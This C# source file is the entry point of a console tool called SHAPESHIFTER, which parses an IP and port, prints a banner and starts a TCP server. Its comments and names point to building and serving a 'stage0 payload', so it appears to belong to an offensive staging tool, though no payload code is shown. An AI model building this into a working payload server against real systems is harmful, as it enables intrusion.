using NDesk.Options;
using System;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace SHAPESHIFTER
{
    class Program
    {
        static readonly string banner = @"
  __       _  __  ___  __      ___ ___ ___ ___ __  
 (_ ` )_) /_) )_) )_  (_ ` )_)  )  )_   )  )_  )_) 
.__) ( ( / / /   (__ .__) ( ( _(_ (    (  (__ / \  
        ";

        static void PrintUsage(OptionSet o)
        {
            Console.WriteLine("Usage: SHAPESHIFTER.exe [options]");
            Console.WriteLine("\nOptions:");
            o.WriteOptionDescriptions(Console.Out);
            return;
        }

        static void Main(string[] args)
        {
            bool _help = false;
            string _host = "";
            int _port = 0;

            OptionSet options = new OptionSet()
            {
                { "ip=", "IP address of your SHAPESHIFTER server. Must be quoted!", (string v)=> _host = v },
                { "port=", "TCP port for the SHAPESHIFTER server", (int v) => _port = v },
                { "h|help",  "Show this message and exit", v => _help = v != null },
            };
            options.Parse(args);

            if (_help)
            {
                Compiler.CompileStage0("a", "b");
                PrintUsage(options);
                return;
            }
            if (_host == String.Empty || _port == 0 || !Helpers.ValidateIP(_host))
            {
                PrintUsage(options);
                return;
            }

            Console.WriteLine(banner, Console.ForegroundColor = ConsoleColor.DarkRed);
            Console.ResetColor();

            // Build the stage0 payload


            // Start the TCP server
            Thread tcpServer = new Thread(() => TcpServer.ServerInit(_host, _port));
            tcpServer.Start();

            return;
        }




    }
}
